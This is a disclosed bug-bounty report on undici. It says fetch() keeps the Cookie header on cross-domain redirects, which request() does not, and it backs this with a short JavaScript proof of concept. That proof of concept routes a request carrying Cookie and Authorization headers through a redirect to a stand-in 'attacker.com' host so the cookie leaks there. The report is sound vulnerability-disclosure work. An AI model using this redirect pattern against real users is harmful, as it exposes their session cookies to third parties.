# Cookie headers are not cleared in cross-domain redirect in undici-fetch

## Report Details
- **Report ID**: 2243710
- **URL**: https://hackerone.com/reports/2243710
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-11-07T15:47:49.424Z
- **Disclosed**: 2024-01-20T16:37:10.259Z

## Reporter
- **Username**: ranjit_p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
AFFECTED MODULE
==========
undici v5.24.0

STEP TO REPRODUCE
==========
i read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-q768-x9m6-m9qp .
It says it properly cleared sensitive headers like cookie,Authorization are cleared during cross domain redirect .
So, i installed undici module and tried to reproduce above 

```
import { request } from 'undici'
const {
  statusCode,
  headers,
  trailers,
  body
} = await request('http://anysite.com/redirect.php?url=http://attacker:8182',{
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
	    cookie: "ddd=dddd"
        }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
  console.log('data', data)
}
```
This will properly clear authorization and cookie header during cross-domain redirect  .


Now i tried with undici-fetch and it failed to clear cookie header during cross-domain redirect

```
import { fetch } from 'undici'

const res = await fetch('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
        maxRedirections: 3,
        headers: {
            AutHorization: 'test',
            Cookie: "ddd=dddd"
        }})
const json = await res.json()
console.log(json)
```

here http://attacker.com:8182/ will get above cookie

## Impact

cross-domain cookie leak

## Attachments
No attachments
